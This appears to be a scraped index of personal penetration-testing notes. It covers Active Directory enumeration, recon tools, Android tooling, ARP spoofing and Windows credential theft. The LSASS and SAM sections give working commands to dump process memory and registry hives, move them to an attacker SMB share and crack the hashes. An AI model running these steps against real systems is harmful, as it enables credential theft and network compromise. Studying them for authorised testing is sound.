<p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory/#reconnaissance-external-recon-and-enumeration-principles","title":"Reconnaissance: External Recon and Enumeration Principles","text":"Resource Examples <code>ASN / IP registrars</code> IANA,\u00a0arin\u00a0for searching the Americas,\u00a0RIPE\u00a0for searching in Europe,\u00a0BGP Toolkit <code>Domain Registrars &amp; DNS</code> Domaintools,\u00a0PTRArchive,\u00a0ICANN, manual DNS record requests against the domain in question or against well known DNS servers, such as\u00a0<code>8.8.8.8</code>. viewdns.info <code>Social Media</code> Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization. <code>Public-Facing Company Websites</code> Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the \"About Us\" and \"Contact Us\" pages can also be gold mines. <code>Cloud &amp; Dev Storage Spaces</code> GitHub,\u00a0AWS S3 buckets &amp; Azure Blog storage containers,\u00a0Google searches using \"Dorks\" <code>Breach Data Sources</code> HaveIBeenPwned\u00a0to determine if any corporate email accounts appear in public breach data,\u00a0Dehashed\u00a0to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.","tags":["active directory","ldap","windows"]},{"location":"active-directory/#set-up","title":"Set up","text":"<p>This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:</p> <ul> <li>A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.</li> <li>A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.</li> <li>A physical presence at their office with our laptop plugged into an ethernet port.</li> <li>A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.</li> <li>VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).</li> <li>From a corporate laptop connected to the client's VPN.</li> <li>On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.</li> <li>On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory/#tools","title":"Tools","text":"Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows\u00a0<code>net*</code>\u00a0commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting. BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the\u00a0SharpHound\u00a0PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a\u00a0Neo4j\u00a0database for graphical analysis of the AD environment. SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. BloodHound.py A Python-based BloodHound ingestor based on the\u00a0Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis. Kerbrute A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing. Impacket toolkit A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. Responder Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. Inveigh.ps1 Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. C# Inveigh (InveighZero) The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes. rpcinfo The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The \"-p\" option is used to specify the target host. For example the command \"rpcinfo -p 10.0.0.1\" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges. rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL. Rubeus Rubeus is a C# tool built for Kerberos Abuse. GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users. Hashcat A great hash cracking and password recovery tool. enum4linux A tool for enumerating information from Windows and Samba systems. enum4linux-ng A rework of the original Enum4linux tool that works a bit differently. ldapsearch Built-in interface for interacting with the LDAP protocol. windapsearch A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. DomainPasswordSpray.ps1 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. LAPSToolkit The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). smbmap SMB share enumeration across a domain. psexec.py Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. wmiexec.py Part of the Impacket toolkit, it provides the capability of command execution over WMI. Snaffler Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. smbserver.py Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. setspn.exe Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. Mimikatz Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host. secretsdump.py Remotely dump SAM and LSA secrets from a host. evil-winrm Provides us with an interactive shell on a host over the WinRM protocol. mssqlclient.py Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. noPac.py Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. rpcdump.py Part of the Impacket toolset, RPC endpoint mapper. CVE-2021-1675.py Printnightmare PoC in python. ntlmrelayx.py Part of the Impacket toolset, it performs SMB relay attacks. PetitPotam.py PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. gettgtpkinit.py Tool for manipulating certificates and TGTs. getnthash.py This tool will use an existing TGT to request a PAC for the current user using U2U. adidnsdump A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. gpp-decrypt Extracts usernames and passwords from Group Policy preferences files. GetNPUsers.py Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. lookupsid.py SID bruteforcing tool. ticketer.py A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc. raiseChild.py Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on\u00a0CMMI\u00a0adapted to AD security). Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). ADRecon A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.","tags":["active directory","ldap","windows"]},{"location":"active-directory/#domain-trust-overview","title":"Domain Trust Overview","text":"<p>A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. </p> <p>Types of trusts:</p> <ul> <li><code>Parent-child</code>: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain\u00a0<code>corp.inlanefreight.local</code>\u00a0could authenticate into the parent domain\u00a0<code>inlanefreight.local</code>, and vice-versa.</li> <li><code>Cross-link</code>: A trust between child domains to speed up authentication.</li> <li><code>External</code>: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes\u00a0SID filtering\u00a0or filters out authentication requests (by SID) not from the trusted domain.</li> <li><code>Tree-root</code>: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.</li> <li><code>Forest</code>: A transitive trust between two forest root domains.</li> <li>ESAE: A bastion forest used to manage Active Directory.</li> </ul> <p>Trusts can be transitive or non-transitive:</p> <ul> <li>A\u00a0<code>transitive</code>\u00a0trust means that trust is extended to objects that the child domain trusts:<ul> <li>Shared, 1 to many.</li> <li>The trust is shared with anyone in the forest. </li> <li>Forest, tree-root, parent-child, and cross-link trusts are transitive.</li> </ul> </li> <li>In a non-transitive trust, the child domain itself is the only one trusted:<ul> <li>Direct trust.</li> <li>Not extended to the next level child domains.</li> <li>Typical for external or custom trust setup.</li> </ul> </li> </ul> <p>Trusts can be set up in two directions: one-way or two-way (bidirectional):</p> <ul> <li> <ul> <li><code>One-way trust</code>: Users in a\u00a0<code>trusted</code>\u00a0domain can access resources in a trusting domain, not vice-versa.</li> </ul> </li> <li><code>Bidirectional trust</code>: Users from both trusting domains can access resources in the other domain. </li> </ul>","tags":["active directory","ldap","windows"]},{"location":"activedirectory-powershell-module/","title":"The ActiveDirectory PowerShell module","text":"<p>The Active Directory module for Windows PowerShell is a PowerShell module that consolidates a group of cmdlets. You can use these cmdlets to manage your Active Directory domains, Active Directory Lightweight Directory Services (AD LDS) configuration sets, and Active Directory Database Mounting Tool instances in a single, self-contained package.</p>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#installation","title":"Installation","text":"<p>Download from The ActiveDirectory PowerShell module github repository </p> <pre><code>Import-Module activedirectory\n</code></pre> <p>This module is Microsoft signed and works even in PowerShell Constrained Language Mode (CLM). </p> <pre><code>Import-Module .\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll\u00a0\n\nImport-Module .\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1\u00a0\n</code></pre> <p>Also, you can copy the DLL from the github repo to your machine and use it to enumerate Active Directory without installing RSAT and without having administrative privileges.</p> <pre><code>Import-Module C:\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#basic-commands","title":"Basic commands","text":"<pre><code># Get ACL for a folder (or a file)\nGet-ACL \u201cC:\\Users\\Public\\Desktop\u201d\n\n# Search for AD elements. [See more in ldap queries](ldap.md)\nGet-ADObject -LDAPFilter &lt;thespecificfilter&gt;\n\n# Count occurrences in a query, like the one above.\n(Get-ADObject -LDAPFilter &lt;thespecificfilter&gt;).count\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#get-addomain","title":"Get-ADDomain","text":"<p>We'll enumerate some basic information about the domain with the Get-ADDomain cmdlet.</p> <pre><code># This will print out helpful information like the domain SID, domain functional level, any child domains, and more.\nGet-ADDomain\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#get-aduser","title":"Get-ADUser","text":"<p>More on https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps.  </p> <pre><code># This command gets all users in the container OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM.\nGet-ADUser -Filter * -SearchBase \"OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM\"\n\n# This command gets all users that have a name that ends with SvcAccount:\nGet-ADUser -Filter 'Name -like \"*SvcAccount\"' | Format-Table Name,SamAccountName -A\n\n# This command gets all of the properties of the user with the SAM account name ChewDavid:\nGet-ADUser -Identity ChewDavid -Properties *\n\n# This command gets the user with the name ChewDavid in the Active Directory Lightweight Directory Services (AD LDS) instance:\nGet-ADUser -Filter \"Name -eq 'ChewDavid'\" -SearchBase \"DC=AppNC\" -Properties \"mail\" -Server lds.Fabrikam.com:50000\n\n# This command gets all enabled user accounts in Active Directory using an LDAP filter: meaning to return all disabled accounts\nGet-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'\n\n# search for all administrative users with the `DoesNotRequirePreAuth` attribute set, meaning that they can be ASREPRoasted:\nGet-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}\n\n# Find all administrative users with the SPN \"servicePrincipalName\" attribute set, meaning that they can likely be subject to a Kerberoasting attack\nGet-ADUser -Filter \"adminCount -eq '1'\" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl\n\n# Another way to retrieve Service Principals\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#get-adcomputer","title":"Get-ADComputer","text":"<pre><code># Search domain computers for interesting hostnames. SQL servers are a particularly juicy target on internal assessments. The below command searches all hosts in the domain using `Get-ADComputer`, filtering on the `DNSHostName` property that contains the word `SQL`\nGet-ADComputer  -Filter \"DNSHostName -like 'SQL*'\"\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#get-adgroup","title":"Get-ADGroup","text":"<pre><code># Group enumeration\nGet-ADGroup -Filter * | select name\n\n# Get detailed information about a group\nGet-ADGroup -Identity \"Backup Operators\"\n\n# Search for administrative groups by filtering on the `adminCount` attribute. If set to `1`, it's protected by AdminSDHolder and known as protected groups. `AdminSDHolder` is owned by the Domain Admins group. It has the privileges to change the permissions of objects in Active Directory. \nGet-ADGroup -Filter \"adminCount -eq 1\" | select Name\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#get-adgroupmember","title":"Get-ADGroupMember","text":"<pre><code># Returns members of a group\nGet-ADGroupMember -Identity \"Backup Operators\"\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"activedirectory-powershell-module/#get-adtrust","title":"Get-ADTrust","text":"<p>Verify domain trust relationships using the\u00a0Get-ADTrust\u00a0cmdlet. This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful  on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. </p> <pre><code>Get-ADTrust -Filter *\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"adidnsdump/","title":"adidnsdump - A tool for enumerating DNS records in Active Directory","text":"<p>By default any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer. This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks.</p>"},{"location":"adidnsdump/#installation","title":"Installation","text":"<p>The tool requires\u00a0<code>impacket</code>\u00a0and\u00a0<code>dnspython</code>\u00a0to function. While the tool works with both Python 2 and 3, Python 3 support requires you to install\u00a0impacket from GitHub.</p> <pre><code>git clone https://github.com/dirkjanm/adidnsdump\ncd adidnsdump\npip install .\n</code></pre>"},{"location":"adidnsdump/#basic-commands","title":"Basic commands","text":"<p>Installation adds the\u00a0<code>adidnsdump</code>\u00a0command to your\u00a0<code>PATH</code>. For help, try\u00a0<code>adidnsdump -h</code>. The tool can be used both directly from the network and via an implant using proxychains. If using proxychains, make sure to specify the\u00a0<code>--dns-tcp</code>\u00a0option.</p> <pre><code>adidnsdump -u $domain\\\\$user ldap://$DomainControllerIP\n# Example:\n# adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 \n</code></pre>"},{"location":"amass/","title":"Amass","text":"<p>In depth DNS Enumeration and network mapping. Amass combines active and passive fingerprinting so being concious about this is really important. It's a assessment tool with reporting features. </p>","tags":["dns enumeration","enumeration","tools"]},{"location":"amass/#install","title":"Install","text":"<pre><code>apt install snapd\nservice snapd start\nsnap install amass\n</code></pre> <p>Before diving into using Amass, we should make the most of it by adding API keys to it. </p> <p>1. First, we can see which data sources are available for Amass (paid and free) by running:</p> <pre><code>amass enum -list \n</code></pre> <p>2. Next, we will need to create a config file to add our API keys to.</p> <pre><code>sudo curl https://raw.githubusercontent.com/OWASP/Amass/master/examples/config.ini &gt;~/.config/amass/config.ini\n</code></pre> <p>3.  Now, see the file ~/.config/amass/config.ini and register in as many services as you can. Once you have obtained your API ID and Secret, edit the config.ini file and add the credentials to the file.</p> <pre><code>sudo nano ~/.config/amass/config.ini\n</code></pre> <p>4. Now, edit the file to add the sources. It is recommended to add:</p> <ul> <li>censys.io: guesswork out of understanding and protecting your organization\u2019s digital footprint.</li> <li>https://asnlookup.com: Quickly lookup updated information about specific Autonomous System Number (ASN), Organization, CIDR, or registered IP addresses (IPv4 and IPv6) among other relevant data. We also offer a free and paid API access!</li> <li>https://otx.alienvault.com:  Quickly identify if your endpoints have been compromised in major cyber attacks using OTX Endpoint Security and many other.</li> <li>https://bigdatacloud.com</li> <li>https://cloudflare.com</li> <li>https://www.digicert.com/tls-ssl/certcentral-tls-ssl-manager: </li> <li>https://fullhunt.io</li> <li>https://github.com</li> <li>https://ipdata.co</li> <li>https://leakix.net</li> <li>as many more as you can.</li> </ul> <p>5. When ready, we can run amass:</p>","tags":["dns enumeration","enumeration","tools"]},{"location":"amass/#basic-usage","title":"Basic usage","text":"<pre><code>amass enum -active -d crapi.apisec.ai  -ip -brute -dir path/to/save/results/\n# enum: Perform ACTIVE  enumerations and network mapping\n# -ip: Show ip addresses of cached subdomais.\n# -brute: Perform a brute force dns attack.\n\namass enum -passive -d crapi.apisec.ai -src  -dir path/to/save/results/\n# enum: Perform PASSIVE enumerations and network mapping.\n# src: display sources of the host domain.\n# -dir: Specify a folder to save results.\n\namass intel -d crapi.apisec.ai\n# intel: Discover targets for enumerations. Passive fingerprinting.\n</code></pre> <p>Some flags:</p> <pre><code>-active: Attempt zone transfer and certificate name grabs.\n-pasive: Passive fingerprinting.\n-bl: Blacklist of subdomain names that will not be investigated\n-d: to specify a domain\n-ip: Show ip addresses of cached subdomais.\n\u2013include-unresolvable: output DNS names that did not resolve.\n-o file.txt: To output the result into a file\n-w: path to a different wordlist file\n</code></pre> <p>Also, to be more precise:</p> <pre><code>amass enum -active -d &lt;target&gt; | grep api\n# amass enum -active -d microsoft.com | grep api\n</code></pre> <p>Amass has several useful command-line options. Use the intel command to collect SSL certificates, search reverse Whois records, and find ASN IDs associated with your target. Start by providing the command with target IP addresses</p> <pre><code>amass intel -addr [target IP addresses]\n</code></pre> <p>If this scan is successful, it will provide you with domain names. These domains can then be passed to intel with the whois option to perform a reverse Whois lookup:</p> <pre><code>amass intel -d [target domain] \u2013whois\n</code></pre> <p>This could give you a ton of results. Focus on the interesting results that relate to your target organization. Once you have a list of interesting domains, upgrade to the enum subcommand to begin enumerating subdomains. If you specify the -passive option, Amass will refrain from directly interacting with your target:</p> <pre><code>amass enum -passive -d [target domain]\n</code></pre> <p>The active enum scan will perform much of the same scan as the passive one, but it will add domain name resolution, attempt DNS zone transfers, and grab SSL certificate information:</p> <pre><code>amass enum -active -d [target domain]\n</code></pre> <p>To up your game, add the -brute option to brute-force subdomains, -w to specify the API_superlist wordlist, and then the -dir option to send the output to the directory of your choice:</p> <pre><code>amass enum -active -brute -w /usr/share/wordlists/API_superlist -d [target domain] -dir [directory name]  \n</code></pre>","tags":["dns enumeration","enumeration","tools"]},{"location":"android-debug-bridge/","title":"Android Debug Bridge - ADB","text":"<p>ADB or Android Debug Bridge is a command-line tool developed to facilitate communication between a computer and a connected emulator or Android device. ADB works with the aid of three components called Client, Daemon, and Server.</p> <ul> <li>Client: It\u2019s is very computer on which you use a command-line terminal to issue an ADB command. which sends commands.</li> <li>Daemon: Or, ADBD is a background process that runs on both connected devices. It\u2019s responsible for running commands on a connected emulator or Android device.</li> <li>Server: It runs in the background and works as a bridge between the Client and the Daemon and manages the communication. which manages communication between the client and the daemon.</li> </ul>","tags":["mobile pentesting"]},{"location":"android-debug-bridge/#basic-commands","title":"Basic commands","text":"<pre><code># Activate remote shell command console on the connected Android smartphone or tablet.\nadb shell\n\n# List Android devices connected to your computer\nadb devices\n# -l: to list devices by model or product number\n\n# Connect to device\nadb connect\n\n# List Android devices connected and emulators in your computer\nshow devices\n\n# Remove a package\npm uninstall --user 0 com.package.name\n\n# Remove a package but leave app data \npm uninstall -k --user 0 com.package.name\n# -k: Keep the app data and cache after package removal\n\n# Reinstall an uninstalled system app\ncmd package install-existing com.package.name\n</code></pre>","tags":["mobile pentesting"]},{"location":"android-debug-bridge/#howtos","title":"Howtos","text":"<ul> <li>Remove bloatware from android device.</li> </ul>","tags":["mobile pentesting"]},{"location":"apktool/","title":"apktool","text":"","tags":["mobile pentesting","tools"]},{"location":"apktool/#installation","title":"Installation","text":"<p>Go to your tool folder and download the tool:</p> <pre><code>wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.0.jar\n</code></pre> <p>Have the device from genymotion already running on Host-Only mode + NAT.</p> <p>Have your kali on Host-Only mode + NAT.</p> <p>Run:</p> <pre><code>adb connect &lt;the device Host-Only IP&gt;:5555\n\n#Making sure that genymotion is not using a proxy:\nadb shell-settings put global http_proxy :0\n\n# Installing the app\nadb install nameOfApp\n</code></pre> <p>To decompile and see source code:</p> <pre><code>java-jar apktool_2.6.0.jar d -s nameOfApp\n# d: decompile\n# -s: source.\n</code></pre> <p>When decompiled, a folder is created. If you go into the folder you will see the file classes.dex, which contains the source code. To see it:</p> <pre><code>jadx-gui\n</code></pre>","tags":["mobile pentesting","tools"]},{"location":"apt-packet-manager/","title":"Package Manager (APT)","text":"<pre><code># Search for a package or text string:\napt search &lt;text_string&gt;\n\n# Show package information:\napt show &lt;package&gt;\n\n# Show package dependencies:\napt depends &lt;package&gt;\n\n# Show the names of all the packages installed in the system:\napt list --installed\n\n# Install a package:\napt install &lt;package&gt;\n\n# Uninstall a package:\napt remove &lt;package&gt;\n\n# Delete a package including its configuration files:\napt purge &lt;package&gt;\n\n# Delete automatically those packages that are not being used (be careful with this command, due to apt's hell dependency it may delete unwanted packages):\napt autoremove\n\n# Update the repositories information:\napt update\n\n# Update a package to the last available version in the repository:\napt upgrade &lt;package&gt;\n\n# Update the full distribution. It will update our system to the next available version:\napt upgrade -y\n\n# Clean caches, downloaded packages, etc:\napt clean &amp;&amp; apt autoclean\n</code></pre>","tags":["bash"]},{"location":"aquatone/","title":"Aquatone - Automatize web scanner in large subdomain lists","text":"<p>Aquatone is a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking a screenshot. This is helpful, especially when dealing with huge subdomain lists.</p> <pre><code>sudo apt install golang chromium-driver\n\ngo get github.com/michenriksen/aquatone\n\nexport PATH=\"$PATH\":\"$HOME/go/bin\"\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"aquatone/#basic-usage","title":"Basic usage","text":"<pre><code>cat example_of_list.txt | aquatone -out ./aquatone -screenshot-timeout 1000\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"arjun/","title":"Arjun","text":"","tags":["api","tools"]},{"location":"arjun/#installation","title":"Installation","text":"<pre><code>sudo git clone\u00a0https://github.com/s0md3v/Arjun.git\n</code></pre> <p>Other ways:</p> <pre><code>pip3 install arjun\n</code></pre>","tags":["api","tools"]},{"location":"arjun/#basic-commands","title":"Basic commands","text":"<pre><code># Run arjun againts a single URL\narjun -u https://api.example.com/endpoint\n\n# arjun will provide you with likely parameters from a wordlist. Its results are based on the deviation of response lengths/codes\narjun --headers \"Content-Type: application/json\" -u http://api.example.com/register -m JSON --include='{$arjun}' --stable\n# -m Get method parameters GET/POST/JDON/XML\n# -i Import targets (a txt list)\n# --include Specify injection point, for example:\n        #  --include='&lt;?xml&gt;&lt;root&gt;$arjun$&lt;/root&gt;\n        #  --include='{\"root\":{\"a\":\"b\",$arjun$}}'\n</code></pre> <p>Awesome wiki about arjun usage: https://github.com/s0md3v/Arjun/wiki/Usage.</p>","tags":["api","tools"]},{"location":"arp-poisoning/","title":"Arp poisoning","text":"<p>This attack is performed by sending gratuitous ARP replies.</p>","tags":["windows","linux","arp","arp poisoning"]},{"location":"arp-poisoning/#intercepting-smb-traffic","title":"Intercepting SMB traffic","text":"<p>We'll be using arpspoof tool, included in dniff.</p>","tags":["windows","linux","arp","arp poisoning"]},{"location":"arpspoof-dniff/","title":"arpspoof from dniff","text":"<p>dniff is a collection of tools for network auditing and penetration testing. It includes arpspoof, a utility designed to intercept traffic on a switched LAN.</p> <p>Before running, enable Linux Kernel IP Forwarding (this transforms Linux box into a router).</p> <pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n</code></pre> <p>And then, run arpspoof:</p> <pre><code>arpspoof -i &lt;interface&gt; -t $ip -r &lt;host IP&gt;\n# interface: NIC you want to use (like eth0 for your local LAN, or tap0 for Hera Lab)\n# target IP: one of the victim address\n# host IP: the other victim address.\n</code></pre> <p>After that, run Wireshark to intercept the traffic.</p> <ul> <li>SMB traffic. When capturing smb traffic in wireshark, go to: FILE&gt;Export Objects&gt;SMB/SMB2. There you have all files uploaded or downloaded from a server during a SMB capture session.</li> <li>Telnet traffic: Telnet sends characters one by one, that's why you don't see the username/password straight away. But with \"Follow TCP Stream\", wireshark will put all data together and you will be able to see the username/password. Just rightclick on a packet of the telnet session and choose: \"Follow TCP Stream\".</li> </ul>","tags":["windows","tools"]},{"location":"attacking-lsass/","title":"Attacking LSASS","text":"<p>See Windows credentials storage.</p>"},{"location":"attacking-lsass/#dumping-lsass-process-memory","title":"Dumping LSASS Process Memory","text":"<p>There are several methods to dump LSASS process memory.</p>"},{"location":"attacking-lsass/#1-task-manager-method","title":"1. Task manager method","text":"<p>Open it. In Process tab, search for <code>Local Security Authority Process</code>. Click right on it and select <code>Create dump file</code>. A file called <code>lsass.DMP</code> is created and saved in:</p> <pre><code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\n</code></pre> <p>Transfer file to attacking machine.</p>"},{"location":"attacking-lsass/#rundll32exe-comsvcsdll-method","title":"Rundll32.exe &amp; Comsvcs.dll method","text":"<p>Modern anti-virus tools recognize this method as malicious activity.</p> <pre><code># Finding LSASS PID in cmd\ntasklist /svc\n\n# Finding LSASS PID in PowerShell\nGet-Process lsass\n\n# Creating lsass.dmp using PowerShell\nrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump &lt;PID&gt; C:\\lsass.dmp full\n# With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\\lsass.dmp). \n</code></pre> <p>Transfer file to attacking machine.</p>"},{"location":"attacking-lsass/#3-pypykatz","title":"3. Pypykatz","text":"<p>pypykatz parses the secrets hidden in the LSASS process memory dump.</p> <pre><code>pypykatz lsa minidump /home/path/lsass.dmp \n</code></pre>"},{"location":"attacking-lsass/#crack-the-file","title":"Crack the file","text":""},{"location":"attacking-lsass/#cracking-the-nt-hash-with-hashcat","title":"Cracking the NT Hash with Hashcat","text":"<pre><code>sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"attacking-sam/","title":"Attacking SAM","text":"<p>See Windows credentials storage.</p>"},{"location":"attacking-sam/#dumping-sam-locally","title":"Dumping SAM Locally","text":""},{"location":"attacking-sam/#1-copying-sam-registry-hives","title":"1. Copying SAM Registry Hives","text":"<p>There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. </p> Registry Hive Description <code>hklm\\sam</code> Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. <code>hklm\\system</code> Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. <code>hklm\\security</code> Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. <p>Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.</p> <pre><code>reg.exe save hklm\\sam C:\\sam.save\n\nreg.exe save hklm\\system C:\\system.save\n\nreg.exe save hklm\\security C:\\security.save\n</code></pre> <p>Transfer the registry hives to our attacker machine, for instance, with smbserver.py from impacket.</p> <pre><code># From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct\n#########################################\nsudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/\n\n# From the victim's machine (windows)\n#########################################\nmove sam.save \\\\$ipAttacker\\CompData\nmove system.save \\\\$ipAttacker\\CompData\nmove security.save \\\\$ipAttacker\\CompData\n</code></pre>"},{"location":"attacking-sam/#2-dumping-hashes-with-impackets-secretsdumppy","title":"2. Dumping Hashes with Impacket's secretsdump.py","text":"<pre><code>locate secretsdump \n</code></pre> <pre><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n</code></pre> <p>Secretsdump dumps the local SAM hashes and would've  also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\\security. </p> <p>The first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt &amp; decrypt the SAM database.</p> 